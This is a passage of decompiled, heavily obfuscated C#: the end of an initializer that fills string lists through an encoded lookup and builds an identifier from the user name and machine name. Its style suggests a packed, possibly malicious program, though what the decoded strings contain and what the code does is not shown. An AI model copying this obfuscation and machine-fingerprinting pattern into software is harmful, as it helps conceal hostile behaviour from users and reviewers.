			dOioDTBjWKE(getString_0(107408733)),
			dOioDTBjWKE(getString_0(107408700)),
			dOioDTBjWKE(getString_0(107408691)),
			dOioDTBjWKE(getString_0(107408650)),
			dOioDTBjWKE(getString_0(107408617)),
			dOioDTBjWKE(getString_0(107408544)),
			dOioDTBjWKE(getString_0(107408503)),
			dOioDTBjWKE(getString_0(107409701)),
			dOioDTBjWKE(getString_0(107409006)),
			dOioDTBjWKE(getString_0(107409624)),
			dOioDTBjWKE(getString_0(107408973)),
			dOioDTBjWKE(getString_0(107408940)),
			dOioDTBjWKE(getString_0(107408867)),
			dOioDTBjWKE(getString_0(107408834)),
			dOioDTBjWKE(getString_0(107408793)),
			dOioDTBjWKE(getString_0(107408784)),
			dOioDTBjWKE(getString_0(107408239)),
			dOioDTBjWKE(getString_0(107408206)),
			dOioDTBjWKE(getString_0(107408165)),
			dOioDTBjWKE(getString_0(107408092)),
			dOioDTBjWKE(getString_0(107408083))
		};
		SCdvQOqShIfe = new List<string>
		{
			dOioDTBjWKE(UdtaLpzykJtzJp(getString_0(107408042))),
			dOioDTBjWKE(getString_0(107408473)),
			dOioDTBjWKE(getString_0(107408380)),
			dOioDTBjWKE(getString_0(107408283)),
			dOioDTBjWKE(getString_0(107407678)),
			dOioDTBjWKE(getString_0(107407581)),
			dOioDTBjWKE(getString_0(107407488)),
			dOioDTBjWKE(getString_0(107407903)),
			dOioDTBjWKE(getString_0(107407810)),
			dOioDTBjWKE(getString_0(107407201)),
			dOioDTBjWKE(getString_0(107407140)),
			dOioDTBjWKE(getString_0(107407011)),
			dOioDTBjWKE(getString_0(107407462)),
			dOioDTBjWKE(UdtaLpzykJtzJp(getString_0(107408042)))
		};
		ErguQgjhMKVLnS = dOioDTBjWKE(getString_0(107407365));
		xzDSpJguZcbP = new List<string>
		{
			dOioDTBjWKE(getString_0(107407220)),
			dOioDTBjWKE(getString_0(107406546)),
			dOioDTBjWKE(getString_0(107406864)),
			dOioDTBjWKE(getString_0(107406158)),
			dOioDTBjWKE(getString_0(107405964)),
			dOioDTBjWKE(getString_0(107406282))
		};
		NcbSEHMiSI = new List<string>
		{
			dOioDTBjWKE(getString_0(107405576)),
			dOioDTBjWKE(getString_0(107405515)),
			dOioDTBjWKE(getString_0(107405454))
		};
		ISThgQIFtJPzEx = getString_0(107397192);
		DwNHVmXMDJftXCxA = getString_0(107397192);
		pPVvULAneWZua = new DateTime(2000, 1, 1);
		vholFJAvnmHlq = new DateTime(2100, 1, 1);
		pxgfCwkrtMaZuuMB = getString_0(107396935);
		reMazhEZDt = getString_0(107388388);
		SHpmwzPilAcVsR = getString_0(107397192);
		dZIbYNGfmZApsZd = getString_0(107397192);
		MFKKCGgtmIAW = getString_0(107397192);
		sLnqamEcKwYO = getString_0(107397192);
		zTCPCwjwADUd = getString_0(107397192);
		ZQgJcWfPvJPQ = getString_0(107397192);
		CCPXDRhgflzG = new List<string>
		{
			getString_0(107395810),
			getString_0(107396068),
			getString_0(107395876),
			getString_0(107395437)
		};
		pvxdiQpIegI = getString_0(107397192);
		WciFeGiWIPgj = getString_0(107405905);
		AjQigOGqXedpaGqDk = getString_0(107397192);
		YTZvEldDkPpHZ = getString_0(107397192);
		woIOBCFOOFhlRn = getString_0(107397192);
		UObhemfryie = string.Empty;
		uXpdCmvnxfyV = getString_0(107397192);
		gnkLqwUIDpnoIoELL = getString_0(107397192);
		DdPKSSdHAf = getString_0(107397192);
		KtRBPSseqispNpz = getString_0(107391504);
		TfVNRoivSZg = getString_0(107391504);
		cIUZZkwMklD = getString_0(107397192);
		wWnQPVWMnAQLeIOR = getString_0(107396935);
		NfFarPiJPL = getString_0(107397192);
		CrKlHXnOdhXo = getString_0(107397192);
		CKMSExNPzZHC = getString_0(107397192);
		vEXrKbJFSmEGOp = getString_0(107405900);
		QlEKeYhMjnU = getString_0(107397192);
		vtcLgmPLsMgV = getString_0(107397192);
		GlAFQHcfgEJyh = getString_0(107405851);
		IbBwmvICpJQnE = getString_0(107397192);
		jhONqlUHAFtixvCn = getString_0(107397192);
		coTyYysvNimxzp = getString_0(107397192);
		sTgORtsqygBpd = getString_0(107397192);
		jJTxLnMtOyZg = getString_0(107405866);
		XkZyuHqUrQdaWf = getString_0(107396935);
		aRGMufFvIRcdU = getString_0(107397192);
		LDqlcaJGohcRKI = getString_0(107396935);
		PVrYUzBrvLL = getString_0(107397192);
		kaCQkWvEmRwtDb = new string[0];
		GEhrwQCvgoMn = getString_0(107396935);
		nWlczaiPXm = true;
		yIbhNgrpygqn = getString_0(107397192);
		intMyWSRTiS = false;
		QHavcRjyWenIGM = false;
		kDsmygHmYhQIyZ = false;
		qBctdZYmhWs = true;
		AIOBtLgIwjoLs = getString_0(107405821);
		JkprrzFPchvjDH = false;
		yQigrfrYMyIiVoJ = false;
		eMwXuwrMrLlHPTPbP = false;
		vIHVrrLyyUkl = false;
		gBBPJhiOSqWIX = true;
		eZSiHLWxxOCmd = getString_0(107405832) + Environment.UserName + getString_0(107405787) + Environment.MachineName + getString_0(107405798) + OTEZtdtAZBqJ.wvJsjjHPPBP() + getString_0(107405761);
		COsiatrWvUa = false;
		dswNsONYQGtdB = new Stopwatch();
		rYmLUpWPpFDd = 0;
		vYQbqQWbSUgNb = 0;
		pkQDLnznjdsc = true;
		UKBmvHPuuZLTSs = getString_0(107405752) + OTEZtdtAZBqJ.wvJsjjHPPBP() + getString_0(107405775);
		NczSZeOnLpX = new string[1] { getString_0(107405770) };
		EMpnMrcluLOg = new List<string>();
		uZwmuWmXUPb = 0;
		mrwrmrZdaUQCXK = false;
		YLZDxMoTnJywGI = true;
		JwVsMsMusHaN = new List<string>();
		PEhDWxwiaMC = new List<string>();
		CRLdtxGaXidO = new List<string>();
	}
}
